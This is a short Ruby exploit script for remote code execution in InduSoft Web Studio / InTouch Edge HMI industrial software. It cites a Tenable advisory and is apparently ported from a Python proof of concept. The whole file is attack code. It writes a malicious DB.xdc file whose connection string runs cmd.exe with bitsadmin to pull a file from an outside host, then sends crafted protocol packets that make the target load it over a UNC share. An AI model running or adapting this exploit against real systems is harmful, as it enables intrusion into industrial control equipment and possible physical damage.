#!/usr/bin/env ruby
# Indusoft Web Studio and InTouch Edge HMI Remote Code Execution
# https://www.tenable.com/security/research/tra-2019-04
# tested against Wonderware InduSoft Web Studio v8.0 SP2 patch 1
# simple port of .py exploit
require 'rex'

sock = Rex::Socket::Tcp.create('PeerHost'  => "", 
                               'PeerPort'  => "1234") # 1234 or 51234

data = %Q|
<?xml version="1.0"?>
<Connection>
	<ConnectionString>{WinExec("cmd.exe /c bitsadmin /Transfer mc http://192.168.1.1:8000/test.txt c:\\users\\mc\\Desktop\\data.txt")}</ConnectionString>
	<User></User>
	<TimeOut>2</TimeOut>
	<LongTimeOut>5</LongTimeOut>
	<HostName>127.0.0.1</HostName>
	<TCPPort>3997</TCPPort>	<Flags>0</Flags>
	<RetryInterval>120</RetryInterval>
</Connection>
|

xdc = File.new("DB.xdc", "wb")
xdc.write(data)
xdc.close

puts "[*] Wrote out 'DB.xdc'..."

def wstr(s)
slen = s.size
s = Rex::Text.to_unicode(s)

 out = "\xff\xfe\xff"
 if slen < 0xff
  out <<  [slen].pack('c') + s 

  elsif slen < 0xffff
  out << "\xff" + [slen].pack('S') + s
 else
  out << "\xff\xff\xff" + [slen].pack('V') + s
 end

 return out
end

# command 66
cmd =  wstr('CO')  # options: EX, CO, CF, CC
cmd << wstr('\\\\' + "unc_share" + '\\P1\\DB') # file to load
cmd << wstr('')
cmd << wstr('')
cmd << wstr('')
cmd << wstr('lolwat')
x = [0x3e80].pack('V') + [0x0].pack('V') + [0x64].pack('V')
cmd = "\x02\x42" + cmd.force_encoding('ASCII-8BIT') + x.force_encoding('ASCII-8BIT') + "\x03"

sock.write("\x02\x31\x10\x31\x10\x38\x10\x31\x10\x31\x03")
res = sock.get_once()
puts Rex::Text.to_hex_dump(res)

sock.write(cmd)
res = sock.get_once()
puts Rex::Text.to_hex_dump(res)

